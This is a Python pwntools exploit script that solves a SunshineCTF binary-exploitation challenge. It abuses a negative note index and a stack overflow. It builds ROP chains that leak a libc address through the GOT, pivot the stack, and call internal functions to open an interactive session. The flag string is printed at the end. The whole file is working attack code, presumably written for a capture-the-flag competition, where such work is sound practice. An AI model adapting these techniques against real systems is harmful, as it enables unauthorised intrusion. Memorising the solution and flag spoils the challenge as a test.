#!/usr/bin/env python3
from pwn import *

PORT = 26007
HOST = "chal.sunshinectf.games"
elf = context.binary = ELF('./service_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force
            b* 0x0000000000401512
            b* 0x0000000000401F14
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

def sla(pr, dt): p.sendlineafter(pr, dt)
def sa(pr, dt): p.sendafter(pr, dt)

pop_rdi = 0x00401529
pop_rsi = 0x00401dd5
pop_rbx_rbp_r12_r13_r14_r15 = 0x401520
ret = 0x40152a
print_str = 0x401C20
write_msg = 0x401d50
replay_func = 0x401f70
read_into_rsp = 0x401f07

note = 0x40a180

sla(b"sh> ", b"NOTE 0 " + p32(-4, signed=True))
sla(b"sh> ", b"NOTE 1 1")

# Leak libc

def submit(pl, sz):
    sla(b'sh> ', f'SUBMIT {sz}')
    sa(b'GO\n', pl)

pl = flat(
	b'A'*0x48,
	pop_rdi, elf.got.write,
	ret,
	print_str,
	pop_rbx_rbp_r12_r13_r14_r15,
    0xf8,
    0, 0, 0, 0, 0,
    ret,
    read_into_rsp
	)

# GDB()
submit(pl, len(pl))
p.recvuntil(b'OK\n')
libc.address = u64(p.recv(6).ljust(8, b'\x00')) - 0x11c560
log.info(f'libc_base: {hex(libc.address)}')

pop_rdx_rbx_r12_r13_rbp = libc.address + 0xb502c

pl = flat(
    b'B'*0x40,
    0,
    pop_rdi,
    3,
    pop_rsi,
    note,

    pop_rdx_rbx_r12_r13_rbp,
    4,
    0,
    0,
    0,
    0,
    ret,
    write_msg,
    pop_rdi,
    note + 0x40,
    ret,
    replay_func
)

p.send(pl.ljust(0xf8, b'C'))
# print(pl)
p.interactive()

# sun{n3gat1ve_h4ndl3s_0pen_s3cret_d00rs}